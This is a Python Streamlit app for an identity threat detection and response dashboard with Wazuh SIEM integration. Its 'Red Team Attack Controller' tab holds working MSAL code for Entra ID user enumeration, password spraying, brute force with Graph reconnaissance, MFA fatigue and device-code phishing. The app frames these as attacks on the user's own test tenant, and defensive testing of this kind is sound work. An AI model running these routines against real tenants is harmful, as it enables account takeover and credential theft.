import streamlit as st
import pandas as pd
import requests
import time
import io
import warnings
from datetime import datetime
import plotly.express as px

# ReportLab Imports for PDF Generation
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable

from modules import config, storage

# --- ATTACK ENGINE İNTEQRASİYASI ---
attack_engine = None
attack_engine_error = None
try:
    from modules.attack_engine import IdentityAttackEngine, USERS_FILE, PASSWORDS_FILE, generate_wordlists

    generate_wordlists()
    attack_engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)
except ImportError as e:
    attack_engine_error = f"Modul import xətası: {e}"
except RuntimeError as e:
    # Ən çox rastlanan hal: .env-də ARGUS_TENANT_ID / CLIENT_ID / CLIENT_SECRET yoxdur
    attack_engine_error = str(e)
except Exception as e:
    attack_engine_error = f"Gözlənilməz xəta: {e}"
# --------------------------------------------------------

# Streamlit Page Config
st.set_page_config(
    page_title="Argus ITDR - Identity Threat Detection",
    page_icon="🛡️",
    layout="wide"
)

if not config.WAZUH_VERIFY_SSL:
    # Self-signed sertifikatlı lokal Wazuh üçün SSL yoxlaması bağlıdırsa,
    # ən azı console-u xəbərdarlıq spam-ından qoruyaq və niyyəti aydın edək.
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def send_to_wazuh(payload):
    if not config.WAZUH_PASSWORD:
        return False, "WAZUH_PASSWORD .env-də təyin olunmayıb."
    try:
        response = requests.post(
            config.WAZUH_ENDPOINT,
            auth=(config.WAZUH_USER, config.WAZUH_PASSWORD),
            headers={"Content-Type": "application/json"},
            json=payload,
            verify=config.WAZUH_VERIFY_SSL,
            timeout=5,
        )
        if response.status_code in [200, 201]:
            return True, response.json()
        else:
            return False, f"HTTP {response.status_code}: {response.text}"
    except Exception as e:
        return False, str(e)


def detect_columns(df: pd.DataFrame) -> dict:
    """
    Fərqli mənbələrdən gələn log-larda sütun adlarını unifikasiya edir.
    Bütün tab-larda təkrarlanan eyni if/else zəncirinin əvəzinə tək yerdən idarə olunur.
    Tapılmayan sütun üçün None qaytarır (fərziyyə ilə mövcud olmayan sütuna
    müraciət edib crash almaq əvəzinə).
    """
    def pick(*candidates):
        for c in candidates:
            if c in df.columns:
                return c
        return None

    return {
        "event": pick("EventID", "event_id"),
        "user": pick("TargetUserName", "user", "TargetUser"),
        "ip": pick("IpAddress", "source_ip", "IP"),
    }


# PDF Generation Function
def generate_pdf_report(df, resolved_users, posture_score):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(
        buffer,
        pagesize=letter,
        rightMargin=36,
        leftMargin=36,
        topMargin=36,
        bottomMargin=36
    )

    styles = getSampleStyleSheet()

    title_style = ParagraphStyle(
        'DocTitle', parent=styles['Heading1'], fontName='Helvetica-Bold',
        fontSize=20, textColor=colors.HexColor("#0E1117"), spaceAfter=6
    )
    subtitle_style = ParagraphStyle(
        'DocSubTitle', parent=styles['Normal'], fontName='Helvetica',
        fontSize=10, textColor=colors.HexColor("#555555"), spaceAfter=15
    )
    h2_style = ParagraphStyle(
        'SectionHeader', parent=styles['Heading2'], fontName='Helvetica-Bold',
        fontSize=14, textColor=colors.HexColor("#1F77B4"), spaceBefore=12, spaceAfter=8
    )
    body_style = ParagraphStyle(
        'BodyDark', parent=styles['Normal'], fontName='Helvetica',
        fontSize=9, textColor=colors.HexColor("#222222")
    )

    elements = []

    elements.append(Paragraph("🛡️ ARGUS ITDR - EXECUTIVE SECURITY AUDIT REPORT", title_style))
    elements.append(Paragraph(
        f"<b>Generated:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} | "
        f"<b>Engine:</b> Argus Security Analytics Platform", subtitle_style))
    elements.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor("#1F77B4"), spaceAfter=15))

    cols = detect_columns(df)
    event_col = cols["event"]
    user_col = cols["user"] or "TargetUserName"
    ip_col = cols["ip"] or "IpAddress"

    total_events = len(df)
    failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else total_events
    remediated_count = len(resolved_users)

    summary_data = [
        [Paragraph("<b>Metric</b>", body_style), Paragraph("<b>Value</b>", body_style), Paragraph("<b>Status / Context</b>", body_style)],
        [Paragraph("Security Posture Score", body_style), Paragraph(f"<b>{posture_score} / 100</b>", body_style), Paragraph("Evaluated via Real-time Risk Engine", body_style)],
        [Paragraph("Total Ingested Events", body_style), Paragraph(str(total_events), body_style), Paragraph("Active Directory / Entra ID Telemetry", body_style)],
        [Paragraph("Identity Threats (Failed Logons)", body_style), Paragraph(str(failed_attempts), body_style), Paragraph("Event ID 4625 Anomalies Detected", body_style)],
        [Paragraph("Threats Remediated", body_style), Paragraph(str(remediated_count), body_style), Paragraph("Conditional Access & Token Revocation", body_style)]
    ]

    summary_table = Table(summary_data, colWidths=[180, 100, 260])
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#EAEAEA")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
        ('TOPPADDING', (0, 0), (-1, -1), 6),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#DDDDDD")),
    ]))

    elements.append(Paragraph("1. Executive Summary", h2_style))
    elements.append(summary_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("2. Threat Analysis & Remediation Log", h2_style))

    table_data = [[
        Paragraph("<b>Target User</b>", body_style),
        Paragraph("<b>Attacker IP</b>", body_style),
        Paragraph("<b>Error Code</b>", body_style),
        Paragraph("<b>Method</b>", body_style),
        Paragraph("<b>Remediation Status</b>", body_style)
    ]]

    if not df.empty:
        for idx, row in df.iterrows():
            user = str(row.get(user_col, "Unknown"))
            ip = str(row.get(ip_col, "127.0.0.1"))
            err = str(row.get("ErrorCode", "AADSTS50126"))
            method = str(row.get("AuthMethod", "OAuth2/NTLM"))

            is_blocked = user in resolved_users
            status_text = "<b><font color='#28A745'>REMEDIATED (Blocked)</font></b>" if is_blocked else "<b><font color='#DC3545'>ACTIVE THREAT</font></b>"

            table_data.append([
                Paragraph(user, body_style),
                Paragraph(ip, body_style),
                Paragraph(err, body_style),
                Paragraph(method, body_style),
                Paragraph(status_text, body_style)
            ])

    threat_table = Table(table_data, colWidths=[110, 100, 90, 100, 140])
    threat_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1F77B4")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
        ('TOPPADDING', (0, 0), (-1, -1), 5),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#CCCCCC")),
    ]))

    elements.append(threat_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("3. Hardening & Strategic Recommendations", h2_style))
    recs = [
        "<b>Enforce Phishing-Resistant MFA:</b> Upgrade identity scopes to require FIDO2 Security Keys or Certificate-Based Authentication.",
        "<b>Deploy Entra ID Protection Policies:</b> Enable automated Smart Lockout thresholds to block password spray IP pools dynamically.",
        "<b>Continuous SIEM Dispatch:</b> Ensure all failed authentication spikes are streaming live into Wazuh Indexer for active SOAR triage.",
        "<b>Session Invalidation:</b> Automatically revoke Active Refresh Tokens for any user accumulating >3 failed sign-ins within 60 seconds."
    ]
    for r in recs:
        elements.append(Paragraph(f"• {r}", body_style))
        elements.append(Spacer(1, 4))

    doc.build(elements)
    buffer.seek(0)
    return buffer


# ----------------------------------------------------------------------
# Session state initialization — İNDİ SQLite-dan yüklənir (persistence)
# ----------------------------------------------------------------------
if 'df' not in st.session_state:
    persisted_df = storage.load_events()
    if persisted_df.empty:
        persisted_df = pd.DataFrame(columns=storage.EVENT_COLUMNS)
    st.session_state['df'] = persisted_df

if 'resolved_users' not in st.session_state:
    st.session_state['resolved_users'] = storage.load_resolved_users()

st.title("🛡️ Argus ITDR - Identity Threat Detection & Response")
st.caption("Real-time Identity Log Analysis, Dynamic Risk Scoring, Analytics & SIEM Integration")

tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
    "📥 Live Log Ingestion",
    "🤖 AI Threat Analysis & Auto-Fix",
    "⚔️ Red Team Attack Controller",
    "🛡️ Blue Team & ITDR Dashboard",
    "📊 Interactive Analytics",
    "🎯 Threat Detection Engine",
    "⚙️ SIEM Integration Test",
    "📄 Security Audit Report"
])

# TAB 1: Live Log Ingestion
with tab1:
    st.header("Active Directory & Identity Logs")
    uploaded_file = st.file_uploader("Upload CSV Log File", type=["csv"])

    if uploaded_file is not None:
        df = pd.read_csv(uploaded_file)
        st.session_state['df'] = df
        storage.append_events(df)
        st.subheader("Raw Identity Events")
        st.dataframe(df, use_container_width=True)
    else:
        if not st.session_state['df'].empty:
            st.subheader("Current Telemetry Logs in Memory")
            st.dataframe(st.session_state['df'], use_container_width=True)
        else:
            st.info("Upload identity telemetry CSV logs or use the Red Team Attack Controller to generate live attack logs.")

# TAB 2: AI Threat Analysis & Auto-Fix
with tab2:
    st.header("🤖 AI Threat Analysis & Remediation")

    if not config.ENABLE_REAL_REMEDIATION:
        st.caption("ℹ️ Hazırda **SIMULATION MODE**-dadır (`.env`-də `ENABLE_REAL_REMEDIATION=false`). "
                   "Remediation düymələri real Entra ID dəyişikliyi ETMİR, yalnız Wazuh-a log göndərir.")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]

        if event_col:
            threat_df = df[df[event_col].astype(str).str.contains('4625')]
            failed_attempts = len(threat_df)
        else:
            failed_attempts = len(df)
            threat_df = df

        resolved_count = len(st.session_state['resolved_users'])
        active_failures = max(0, failed_attempts - resolved_count)
        calculated_score = max(0, 100 - (active_failures * 10))

        if calculated_score >= 80:
            risk_label = "Low Risk (Healthy Environment)"
        elif calculated_score >= 50:
            risk_label = "Medium Risk (Suspicious Activity)"
        else:
            risk_label = "Critical Risk (Active Threat Detected)"

        col1, col2, col3 = st.columns(3)
        with col1:
            st.metric(
                label="Real-time Security Posture Score",
                value=f"{calculated_score} / 100",
                delta=risk_label,
                delta_color="normal" if calculated_score >= 80 else "inverse"
            )
        with col2:
            st.metric(label="Active Identity Threats", value=f"{active_failures} Events")
        with col3:
            st.metric(label="Threats Remediated", value=f"{resolved_count} Users Blocked")

        st.markdown("---")
        st.subheader("💡 Dynamic Remediation Guidance & Action")

        if len(threat_df) == 0:
            st.success("✅ No active identity threats detected in telemetry.")
        else:
            for idx, row in threat_df.iterrows():
                user = str(row.get(user_col, f"User_{idx}")) if user_col else "Unknown User"
                ip = str(row.get(ip_col, "185.220.101.5")) if ip_col else "185.220.101.5"
                auth_method = row.get("AuthMethod", "OAuth2/NTLM")
                err_code = row.get("ErrorCode", "AADSTS50126")

                is_resolved = user in st.session_state['resolved_users']

                with st.expander(f"⚠️ **Target User:** {user} | **Event ID:** 4625 | **Error:** {err_code} | **IP:** {ip}", expanded=not is_resolved):
                    if is_resolved:
                        st.success(f"✅ Remediation already applied for `{user}`.")
                    else:
                        st.error(f"🚨 **Risk Assessment:** Active Threat Detected on `{user}` via `{auth_method}`!")
                        st.info(f"🤖 **Suggested Action:** Revoke all Active Refresh Tokens and trigger Conditional Access Lockout for `{user}`.")

                        if st.button(f"🚫 Execute Remediation ({user})", key=f"btn_ai_block_{idx}_{user}"):
                            use_real = config.ENABLE_REAL_REMEDIATION and attack_engine is not None

                            if use_real:
                                ok1, msg1 = attack_engine.revoke_sign_in_sessions(user)
                                ok2, msg2 = attack_engine.disable_account(user)
                                real_ok = ok1 and ok2
                                detail = f"{msg1} | {msg2}"
                                mode = "REAL"
                            else:
                                real_ok = True
                                detail = "Simulation mode: no real Entra ID change was made."
                                mode = "SIMULATION"

                            alert_payload = {
                                "timestamp": datetime.utcnow().isoformat() + "Z",
                                "event_type": "REMEDIATION_EXECUTION",
                                "target_user": user,
                                "source_ip": ip,
                                "action_taken": "ACCOUNT_DISABLED_ENTRA_ID" if mode == "REAL" else "SIMULATED_LOCKOUT",
                                "triggered_by": "Argus-Engine",
                                "status": "SUCCESS" if real_ok else "FAILED",
                                "detail": detail,
                                "mode": mode,
                            }
                            send_to_wazuh(alert_payload)

                            if real_ok:
                                st.session_state['resolved_users'].add(user)
                                storage.add_resolved_user(user)
                                st.success(f"✅ [{mode}] {detail}")
                            else:
                                st.error(f"❌ [{mode}] {detail}")
                            st.rerun()
    else:
        st.warning("⚠️ No logs ingested or generated yet. Upload CSV or run Red Team Attack Simulation.")

# TAB 3: Red Team Attack Controller & Simulation Engine
with tab3:
    st.header("⚔️ Red Team Attack Controller & Simulation Engine")
    st.caption("Execute MSAL authentication attacks against your own Microsoft Entra ID test tenant.")

    if attack_engine is None:
        st.error(
            "❌ Attack Engine yüklənmədi: "
            f"{attack_engine_error or 'naməlum xəta'}\n\n"
            "`.env` faylında `ARGUS_TENANT_ID`, `ARGUS_CLIENT_ID`, `ARGUS_CLIENT_SECRET` "
            "dəyərlərini doldurduğunuzdan əmin olun."
        )

    col_left, col_right = st.columns([1, 1])

    with col_left:
        st.subheader("⚙️ Custom Attack Parameters")
        default_domain = config.DOMAIN or "example.onmicrosoft.com"
        target_user_input = st.text_input("Target User (for Brute Force / MFA)", value=f"user2@{default_domain}")
        spray_password_input = st.text_input("Spray Password", value="")
        max_targets_count = st.slider("Max Target Limit", min_value=1, max_value=50, value=18)

        st.markdown("---")
        st.subheader("🎯 Attack Triggers")

        btn_enum = st.button("🔍 Launch User Enumeration", disabled=attack_engine is None)
        btn_spray = st.button("🚀 Launch Password Spray Attack", disabled=attack_engine is None)
        btn_brute = st.button("🔨 Launch Brute Force Attack", disabled=attack_engine is None)
        btn_mfa = st.button("📲 Launch MFA Fatigue Simulation", disabled=attack_engine is None)
        btn_device = st.button("🔑 Launch Device Code Flow Phishing", disabled=attack_engine is None)

    with col_right:
        st.subheader("🖥️ Live Attack Terminal Console (`attack_engine.py`)")
        terminal_placeholder = st.empty()

        terminal_placeholder.code(
            "[+] Attack Engine Initialized...\n"
            f"[+] Target Domain: {config.DOMAIN or '(not configured)'}\n"
            "[*] Ready to execute authentication attempts against Entra ID.",
            language="bash"
        )

    if attack_engine is not None and (btn_enum or btn_spray or btn_brute or btn_mfa or btn_device):
        console_logs = []
        new_events = []

        if btn_enum:
            console_logs.append(f"[*] Executing User Enumeration (Max: {max_targets_count})...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            for user in attack_engine.users[:max_targets_count]:
                result = attack_engine.public_app.acquire_token_by_username_password(
                    username=user, password="DummyPassword123!", scopes=["https://graph.microsoft.com/.default"]
                )
                err_desc = result.get("error_description", "")
                if any(code in err_desc for code in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
                    status_text = f"[+] MÖVCUDDUR (Valid User): {user}"
                elif "AADSTS50034" in err_desc:
                    status_text = f"[-] MÖVCUD DEYİL (Invalid User): {user}"
                else:
                    status_text = f"[?] CAVAB ({user}): {err_desc[:40]}..."

                console_logs.append(status_text)
                terminal_placeholder.code("\n".join(console_logs), language="bash")

        elif btn_spray:
            if not spray_password_input:
                st.warning("Spray Password boşdur — sınaq üçün bir şifrə daxil edin.")
            else:
                console_logs.append(f"[*] Executing Password Spray...\n")
                terminal_placeholder.code("\n".join(console_logs), language="bash")

                for user in attack_engine.users[:max_targets_count]:
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=user, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                    )
                    if "access_token" in result:
                        res_line = f"[+] UĞURLU: {user}"
                        evt_id = 4624
                        status = "SUCCESS"
                    else:
                        err = result.get("error_description", "").splitlines()[0]
                        res_line = f"[-] UĞURSUZ: {user} -> ({err[:40]}...)"
                        evt_id = 4625
                        status = "FAILED"

                    console_logs.append(res_line)
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    new_events.append({
                        "EventID": evt_id,
                        "TargetUserName": user,
                        "IpAddress": "185.220.101.5",
                        "Status": status,
                        "AuthMethod": "PasswordSpray",
                        "ErrorCode": result.get("error", "None")
                    })

        elif btn_brute:
            console_logs.append(f"[*] Executing Brute Force against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            test_passwords = attack_engine.passwords[:5]
            for pwd in test_passwords:
                result = attack_engine.public_app.acquire_token_by_username_password(
                    username=target_user_input, password=pwd, scopes=["https://graph.microsoft.com/.default"]
                )
                if "access_token" in result:
                    console_logs.append(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{pwd}'")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    console_logs.append("\n[*] Running Post-Exploitation Reconnaissance...")
                    headers = {"Authorization": f"Bearer {result['access_token']}"}
                    resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
                    if resp.status_code == 200:
                        u_data = resp.json()
                        console_logs.append(f"[+] User Info Retrieved: {u_data.get('displayName')} ({u_data.get('userPrincipalName')})")
                    break
                else:
                    err = result.get("error_description", "").splitlines()[0]
                    console_logs.append(f"[-] UĞURSUZ: {pwd} -> ({err[:35]}...)")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                time.sleep(0.5)

        elif btn_mfa:
            console_logs.append(f"[*] Executing MFA Fatigue Simulation against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            if not spray_password_input:
                st.warning("MFA simulyasiyası üçün Spray Password sahəsinə hədəfin bilinən şifrəsini daxil edin.")
            else:
                for i in range(1, 3):
                    console_logs.append(f"[*] Attempt #{i}...")
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=target_user_input, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                    )
                    err_desc = result.get("error_description", "")
                    first_line = err_desc.splitlines()[0] if err_desc else "Success/Token"
                    console_logs.append(f" └─ Response: {first_line[:55]}...")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                    time.sleep(1)

        elif btn_device:
            console_logs.append("[*] Initiating OAuth Device Code Flow...\n")
            flow = attack_engine.public_app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
            if "user_code" in flow:
                console_logs.append(f"[+] Verification URL: {flow['verification_uri']}")
                console_logs.append(f"[+] User Code: {flow['user_code']}")
            else:
                console_logs.append("[-] Device Code Flow initiation failed.")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

        if new_events:
            new_df = pd.DataFrame(new_events)
            st.session_state['df'] = pd.concat([st.session_state['df'], new_df], ignore_index=True)
            storage.append_events(new_df)

            for ev in new_events:
                send_to_wazuh({
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "event_id": ev["EventID"],
                    "user": ev["TargetUserName"],
                    "source_ip": ev["IpAddress"],
                    "rule_title": "RedTeam MSAL Attack Executed",
                    "severity": "HIGH",
                    "source": "Argus-RedTeam-Engine"
                })

        st.success("Attack execution completed.")

# TAB 4: Blue Team & ITDR Dashboard
with tab4:
    st.header("🛡️ Blue Team & ITDR Monitoring Dashboard")
    st.caption("Real-time Event Feed, Entra ID Sign-in Logs & Microsoft Smart Lockout Watchlist")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col, ip_col = cols["event"], cols["user"], cols["ip"]

        st.subheader("🔒 Active Lockout Watchlist (Smart Lockout Triggered)")

        if event_col and user_col:
            lockout_users = df[df[event_col] == 4625][user_col].value_counts()
            locked_accounts = lockout_users[lockout_users >= 3].index.tolist()
        else:
            lockout_users = pd.Series(dtype=int)
            locked_accounts = []

        if len(locked_accounts) > 0:
            cols_ui = st.columns(min(len(locked_accounts), 4))
            for idx, account in enumerate(locked_accounts):
                with cols_ui[idx % 4]:
                    st.error(f"👤 **Account:** `{account}`\n\n🚨 **Status:** LOCKED (AADSTS50053)\n\n📍 **Attempts:** {lockout_users[account]} Failures")
        else:
            st.success("✅ No accounts currently locked by Microsoft Smart Lockout threshold.")

        st.markdown("---")

        col_feed, col_logs = st.columns([1, 1.2])

        with col_feed:
            st.subheader("⚡ Live Incident Feed")
            severity_filter = st.selectbox("Filter by Severity", ["ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW"])

            for idx, row in df.iterrows():
                event_id = row.get(event_col, 4625) if event_col else 4625
                user = row.get(user_col, "Unknown") if user_col else "Unknown"
                ip = row.get(ip_col, "127.0.0.1") if ip_col else "127.0.0.1"
                err_code = row.get("ErrorCode", "AADSTS50126")

                if err_code == "AADSTS50053" or (event_id == 4625 and idx > 3):
                    sev = "CRITICAL"
                elif err_code == "AADSTS50034":
                    sev = "MEDIUM"
                elif event_id == 4625:
                    sev = "HIGH"
                else:
                    sev = "LOW"

                if severity_filter != "ALL" and sev != severity_filter:
                    continue

                if sev == "CRITICAL":
                    st.error(f"🔴 **[CRITICAL]** Account Lockout / Brute Force on `{user}` from `{ip}` | Error: `{err_code}`")
                elif sev == "HIGH":
                    st.warning(f"🟠 **[HIGH]** Failed Authentication (`4625`) on `{user}` from `{ip}` | Error: `{err_code}`")
                elif sev == "MEDIUM":
                    st.info(f"🟡 **[MEDIUM]** User Enumeration (`4625`) on `{user}` from `{ip}` | Error: `{err_code}`")
                else:
                    st.info(f"🟢 **[LOW]** Successful Logon (`4624`) for `{user}` from `{ip}`")

        with col_logs:
            st.subheader("📋 Entra ID Sign-in Logs Table")
            st.dataframe(df, use_container_width=True)
    else:
        st.warning("⚠️ No telemetry feed available. Ingest logs in Tab 1 or trigger Red Team simulation in Tab 3.")

# TAB 5: Interactive Analytics
with tab5:
    st.header("📊 Interactive Analytics & Threat Visualizations")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        cols = detect_columns(df)
        event_col, user_col = cols["event"], cols["user"]

        col_left, col_right = st.columns(2)

        with col_left:
            st.subheader("🎯 Top 5 Targeted Accounts")
            if event_col and user_col:
                failed_df = df[df[event_col] == 4625]
                if len(failed_df) > 0:
                    top_users = failed_df[user_col].value_counts().head(5).reset_index()
                    top_users.columns = ['Account Name', 'Failed Attempts']

                    fig_bar = px.bar(top_users, x='Failed Attempts', y='Account Name', orientation='h',
                                      color='Failed Attempts', color_continuous_scale='Reds', text='Failed Attempts')
                    st.plotly_chart(fig_bar, use_container_width=True)
                else:
                    st.info("No failed logon attempts recorded.")
            else:
                st.info("İstifadəçi/hadisə sütunları tapılmadı.")

        with col_right:
            st.subheader("📊 Failure vs Success Ratio")
            if event_col:
                status_counts = df[event_col].map({4625: 'FAILED (4625)', 4624: 'SUCCESS (4624)'}).value_counts().reset_index()
                status_counts.columns = ['Logon Status', 'Event Count']

                fig_pie = px.pie(status_counts, names='Logon Status', values='Event Count', color='Logon Status',
                                  color_discrete_map={'FAILED (4625)': '#ef553b', 'SUCCESS (4624)': '#00cc96'}, hole=0.4)
                st.plotly_chart(fig_pie, use_container_width=True)

        st.markdown("---")
        st.subheader("📈 Attack Intensity Timeline & Velocity")
        df_timeline = df.copy()
        df_timeline['Attempt_Sequence'] = df_timeline.index + 1

        if event_col:
            df_timeline['Event_Type'] = df_timeline[event_col].apply(
                lambda x: "Failed Logon (4625)" if x == 4625 else "Success Logon (4624)")
            fig_line = px.line(df_timeline, x='Attempt_Sequence', y=df_timeline.index, color='Event_Type', markers=True,
                                color_discrete_map={'Failed Logon (4625)': '#d62728', 'Success Logon (4624)': '#2ca02c'})
            st.plotly_chart(fig_line, use_container_width=True)
    else:
        st.warning("⚠️ No data available for visualization.")

# TAB 6: Threat Detection Engine
with tab6:
    st.header("Threat Detection Engine")
    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        st.warning("⚠️ High Risk Identity Threats Detected!")

        if st.button("🚨 Dispatch All Threats to Wazuh SIEM"):
            success_count = 0
            for idx, row in df.iterrows():
                payload = {
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "event_id": row.get("EventID", 4625),
                    "user": row.get("TargetUserName", "unknown"),
                    "source_ip": row.get("IpAddress", "127.0.0.1"),
                    "rule_title": "Identity Anomaly Detected",
                    "severity": "HIGH", "source": "Argus-ITDR"
                }
                status, _ = send_to_wazuh(payload)
                if status:
                    success_count += 1
            st.success(f"✅ Dispatched {success_count} events to Wazuh Indexer!")
    else:
        st.info("No threats to dispatch.")

# TAB 7: SIEM Integration Test
with tab7:
    st.header("Manual Telemetry Injection")
    col1, col2 = st.columns(2)
    with col1:
        target_user = st.text_input("Target User", value="john_doe")
        source_ip = st.text_input("Source IP", value="10.0.0.45")
    with col2:
        event_type = st.selectbox("Event Type", ["Brute Force Attack", "Kerberoasting", "Golden Ticket Misuse"])
        severity = st.selectbox("Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"], index=2)

    if st.button("Send Live Telemetry"):
        test_payload = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "user": target_user, "source_ip": source_ip,
            "rule_title": event_type, "severity": severity, "source": "Argus-ITDR-ManualTest"
        }
        ok, res = send_to_wazuh(test_payload)
        if ok:
            st.success("✅ Log indexed in Wazuh!")
            st.json(test_payload)
        else:
            st.error(f"❌ Failed: {res}")

# TAB 8: Security Audit Report Generator
with tab8:
    st.header("📄 Automated PDF Security Audit Report Generator")
    st.caption("Generate an official, executive-ready PDF Audit Report containing attack telemetry, risk scoring, and remediation history.")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        resolved_users = st.session_state.get('resolved_users', set())

        cols = detect_columns(df)
        event_col = cols["event"]
        failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else len(df)
        active_failures = max(0, failed_attempts - len(resolved_users))
        posture_score = max(0, 100 - (active_failures * 10))

        st.subheader("📋 Report Content Preview Summary")

        c1, c2, c3 = st.columns(3)
        with c1:
            st.info(f"**Total Events Included:** {len(df)}")
        with c2:
            st.error(f"**Identified Threats:** {failed_attempts}")
        with c3:
            st.success(f"**Remediated Accounts:** {len(resolved_users)}")

        st.markdown("---")
        st.subheader("📥 Export Audit Report")

        pdf_bytes = generate_pdf_report(df, resolved_users, posture_score)

        timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"Argus_ITDR_Security_Report_{timestamp_str}.pdf"

        st.download_button(
            label="📄 Download Official PDF Security Audit Report",
            data=pdf_bytes,
            file_name=filename,
            mime="application/pdf",
            use_container_width=True
        )
    else:
        st.warning("⚠️ No simulation data or telemetry available to build a report. Run Red Team simulations or upload logs first.")